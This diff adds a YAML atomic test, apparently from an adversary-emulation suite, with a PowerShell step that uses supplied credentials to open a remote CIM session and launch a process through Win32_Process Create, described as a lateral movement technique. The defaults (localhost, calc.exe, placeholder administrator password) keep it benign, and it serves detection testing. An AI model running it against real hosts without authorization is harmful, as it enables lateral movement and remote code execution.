@@ -1,0 +1,37 @@
+api_version: "2.0"
+name: WMI Invoke-CimMethod Start Process
+description: |
+    The following Atomic will create a New-CimSession on a remote endpoint and start a process usnig Invoke-CimMethod.
+    This is a novel way to perform lateral movement or to start a remote process.
+    This does require WinRM to be enabled. The account performing the run will also need to be elevated.
+    A successful execution will stdout that the process started. On the remote endpoint, wmiprvse.exe will spawn the given process.
+args:
+    - name: dest
+      type: string
+      default: localhost
+    - name: password
+      type: string
+      default: P@ssword1
+    - name: username
+      type: string
+      default: Administrator
+    - name: process
+      type: string
+      default: calc.exe
+uuid: adae83d3-0df6-45e7-b2c3-575f91584577
+mitre:
+    tactics:
+        - 'TA0004: Privilege Escalation'
+        - 'TA0003: Persistence'
+    techniques:
+        - 'T1546: Event Triggered Execution'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: wmi-invoke-cimmethod-start-process
+      inline: "# Set the remote computer name and credentials\n $RemoteComputer = \"{{.Args.dest}}\"\n $PWord = ConvertTo-SecureString -String \"{{.Args.password}}\" -AsPlainText -Force\n $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"{{.Args.username}}\", $Pword\n\n # Create a CIM session\n $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential\n\n # Define the process you want to start\n $ProcessToStart = \"{{.Args.process}}\"\n\n # Invoke the Create method on the Win32_Process class to start the process\n $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}\n\n # Check the result\n if ($Result.ReturnValue -eq 0) {\n     Write-Host \"Process started successfully with Process ID: $($Result.ProcessId)\"\n } else {\n     Write-Host \"Failed to start the process. Error code: $($Result.ReturnValue)\"\n }\n\n # Clean up the CIM session\n Remove-CimSession -CimSession $CimSession \n"
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
